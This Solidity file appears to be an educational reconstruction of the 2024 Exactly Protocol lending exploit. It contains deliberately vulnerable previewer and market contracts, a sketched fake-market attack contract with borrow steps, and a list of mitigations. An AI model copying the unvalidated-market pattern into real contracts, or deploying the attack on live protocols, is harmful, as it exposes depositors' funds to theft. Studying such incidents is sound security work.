// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * EXACTLY PROTOCOL EXPLOIT (August 2024)
 * Loss: $12 million
 * Attack: Oracle Price Manipulation via DebtPreviewer Contract
 *
 * VULNERABILITY OVERVIEW:
 * Exactly Protocol, a decentralized lending market, was exploited through a vulnerability
 * in its DebtPreviewer helper contract. The previewer incorrectly calculated debt positions,
 * allowing attackers to manipulate their perceived debt and borrow more than collateralized.
 *
 * ROOT CAUSE:
 * 1. DebtPreviewer used incorrect accounting for debt calculations
 * 2. Malicious market contract could return false data
 * 3. Protocol trusted previewer's calculations without validation
 * 4. Missing sanity checks on borrow limits
 *
 * ATTACK FLOW:
 * 1. Attacker deposited collateral into Exactly Protocol
 * 2. Created malicious market contract with fake asset
 * 3. DebtPreviewer queried malicious market for debt calculations
 * 4. Malicious market returned manipulated data showing low/zero debt
 * 5. Protocol allowed over-borrowing based on false debt figures
 * 6. Attacker borrowed $12M against minimal actual collateral
 * 7. Withdrew borrowed assets and abandoned position
 */

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address account) external view returns (uint256);
}

interface IMarket {
    function getAccountSnapshot(
        address account
    )
        external
        view
        returns (uint256 collateral, uint256 borrows, uint256 exchangeRate);
}

/**
 * DebtPreviewer - Helper contract for calculating account health
 * VULNERABILITY: Trusts arbitrary market contracts without validation
 */
contract DebtPreviewer {
    /**
     * @dev VULNERABILITY: Accepts any address as market parameter
     * @dev Allows attacker to provide malicious market contract
     */
    function previewDebt(
        address market,
        address account
    )
        external
        view
        returns (
            uint256 collateralValue,
            uint256 debtValue,
            uint256 healthFactor
        )
    {
        // VULNERABILITY 1: No validation that 'market' is legitimate
        // VULNERABILITY 2: Trusts data from user-provided address

        // Query market for account snapshot
        // VULNERABILITY 3: Malicious market can return false data
        (uint256 collateral, uint256 borrows, uint256 exchangeRate) = IMarket(
            market
        ).getAccountSnapshot(account);

        // VULNERABILITY 4: Uses manipulated data for critical calculations
        collateralValue = (collateral * exchangeRate) / 1e18;
        debtValue = borrows;

        // VULNERABILITY 5: Health factor calculated from fake data
        if (debtValue == 0) {
            healthFactor = type(uint256).max;
        } else {
            healthFactor = (collateralValue * 1e18) / debtValue;
        }

        return (collateralValue, debtValue, healthFactor);
    }

    /**
     * @dev VULNERABILITY 6: Batch preview allows mixing real and fake markets
     */
    function previewMultipleMarkets(
        address[] calldata markets,
        address account
    )
        external
        view
        returns (
            uint256 totalCollateral,
            uint256 totalDebt,
            uint256 overallHealth
        )
    {
        for (uint256 i = 0; i < markets.length; i++) {
            // VULNERABILITY 7: Each market address unvalidated
            (uint256 collateral, uint256 debt, ) = this.previewDebt(
                markets[i],
                account
            );

            totalCollateral += collateral;
            totalDebt += debt;
        }

        if (totalDebt == 0) {
            overallHealth = type(uint256).max;
        } else {
            overallHealth = (totalCollateral * 1e18) / totalDebt;
        }

        return (totalCollateral, totalDebt, overallHealth);
    }
}

/**
 * Exactly Protocol Lending Market
 */
contract ExactlyMarket {
    IERC20 public asset;
    DebtPreviewer public previewer;

    mapping(address => uint256) public deposits;
    mapping(address => uint256) public borrows;

    uint256 public constant COLLATERAL_FACTOR = 80; // 80%

    constructor(address _asset, address _previewer) {
        asset = IERC20(_asset);
        previewer = DebtPreviewer(_previewer);
    }

    function deposit(uint256 amount) external {
        asset.transferFrom(msg.sender, address(this), amount);
        deposits[msg.sender] += amount;
    }

    /**
     * @dev VULNERABILITY 8: Borrow limit check relies on DebtPreviewer
     * @dev DebtPreviewer can be manipulated to show false debt levels
     */
    function borrow(uint256 amount, address[] calldata markets) external {
        // VULNERABILITY 9: Uses previewer for health check
        // VULNERABILITY 10: User provides markets array (can include malicious markets)
        (uint256 totalCollateral, uint256 totalDebt, ) = previewer
            .previewMultipleMarkets(markets, msg.sender);

        // Calculate new debt after this borrow
        uint256 newDebt = totalDebt + amount;

        // VULNERABILITY 11: Check based on manipulated totalCollateral
        uint256 maxBorrow = (totalCollateral * COLLATERAL_FACTOR) / 100;
        require(newDebt <= maxBorrow, "Insufficient collateral");

        borrows[msg.sender] += amount;
        asset.transfer(msg.sender, amount);
    }

    function getAccountSnapshot(
        address account
    )
        external
        view
        returns (uint256 collateral, uint256 borrowed, uint256 exchangeRate)
    {
        return (deposits[account], borrows[account], 1e18);
    }
}

/**
 * ATTACK SCENARIO:
 *
 * Setup Phase:
 * 1. Attacker deploys malicious market contract:
 *    contract MaliciousMarket {
 *        function getAccountSnapshot(address) external pure returns (
 *            uint256, uint256, uint256
 *        ) {
 *            // Return huge fake collateral, zero debt
 *            return (1000000 * 1e18, 0, 1e18);
 *        }
 *    }
 *
 * Deposit Phase:
 * 2. Attacker deposits small real collateral:
 *    exactlyMarket.deposit(10 ETH)  // ~$20K
 *
 * Manipulation Phase:
 * 3. Attacker calls borrow with mixed market array:
 *    address[] markets = [
 *        realMarketAddress,      // Shows: 10 ETH collateral, 0 debt
 *        maliciousMarketAddress  // Shows: 1M ETH fake collateral, 0 debt
 *    ];
 *
 * 4. DebtPreviewer.previewMultipleMarkets() calculates:
 *    totalCollateral = 10 ETH + 1M ETH = 1,000,010 ETH
 *    totalDebt = 0
 *    healthFactor = infinite
 *
 * 5. Borrow check passes:
 *    maxBorrow = 1,000,010 ETH * 80% = 800,008 ETH
 *    Attacker can borrow up to $1.6B worth!
 *
 * Exploitation Phase:
 * 6. Attacker borrows maximum available liquidity:
 *    borrow(USDC, 5M USDC)
 *    borrow(ETH, 3000 ETH)
 *    borrow(DAI, 4M DAI)
 *    Total: ~$12M
 *
 * 7. Attacker transfers borrowed assets out
 * 8. Abandons position with $20K collateral left
 *
 * MITIGATION STRATEGIES:
 *
 * 1. Whitelist Verified Markets:
 *    mapping(address => bool) public approvedMarkets;
 *    require(approvedMarkets[market], "Market not approved");
 *
 * 2. Direct Balance Queries:
 *    // Don't trust external previewer
 *    // Query markets directly from protocol
 *    function getCollateral(address user) internal view returns (uint256) {
 *        return deposits[user];
 *    }
 *
 * 3. Oracle Integration:
 *    // Use trusted price oracle instead of user-provided data
 *    uint256 collateralValue = oracle.getPrice(asset) * deposits[user];
 *
 * 4. Market Registry:
 *    // Maintain on-chain registry of legitimate markets
 *    address[] public registeredMarkets;
 *    mapping(address => bool) public isRegistered;
 *
 * 5. Sanity Checks:
 *    require(collateralValue < MAX_REASONABLE_VALUE, "Unrealistic collateral");
 *    require(healthFactor < 1000 * 1e18, "Suspiciously high");
 *
 * 6. Rate Limiting:
 *    // Limit borrow amount per transaction/timeperiod
 *    require(amount <= MAX_SINGLE_BORROW, "Amount too large");
 *
 * 7. Two-Step Verification:
 *    // Cross-verify debt calculations through multiple methods
 *    uint256 debt1 = calculateDebtMethod1();
 *    uint256 debt2 = calculateDebtMethod2();
 *    require(debt1 == debt2, "Debt calculation mismatch");
 *
 * 8. Isolated Market Queries:
 *    // Don't allow batch queries that mix markets
 *    // Query each approved market separately within protocol
 */
